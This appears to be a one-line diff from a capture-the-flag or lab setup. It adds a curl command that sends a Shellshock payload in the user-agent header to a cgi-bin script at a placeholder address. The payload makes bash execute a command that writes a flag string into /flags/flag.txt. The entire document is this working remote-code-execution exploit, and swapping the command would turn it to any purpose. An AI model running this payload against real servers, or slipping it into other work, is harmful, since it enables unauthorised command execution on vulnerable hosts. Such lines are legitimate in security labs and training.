@@ -1,0 +1,1 @@
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo MY_FLAG > /flags/flag.txt'" http://<address>/cgi-bin/vulnerable
